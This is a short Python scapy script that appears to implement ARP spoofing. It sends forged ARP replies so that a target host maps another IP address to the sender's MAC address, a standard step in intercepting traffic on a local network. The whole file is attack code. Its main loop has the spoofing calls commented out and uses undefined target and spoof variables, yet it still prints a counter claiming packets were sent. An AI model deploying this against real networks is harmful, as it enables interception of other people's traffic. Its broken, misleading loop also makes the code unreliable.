#!/usr/bin/python3

import scapy.all as scapy
import time

def get_mac(ip_add):
    packet = scapy.ARP(op=1, pdst=ip_add, hwdst="ff:ff:ff:ff:ff:ff")
    ans_list = scapy.sr(packet)[0]
    return ans_list[0][1].hwsrc

def send_response(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

count = 0
while True:
    # send_response(target_ip, spoof_ip)
    # send_response(target_ip, spoof_ip)
    count += 2
    print("\rPacket sent : " + str(count), end="")
    time.sleep(2)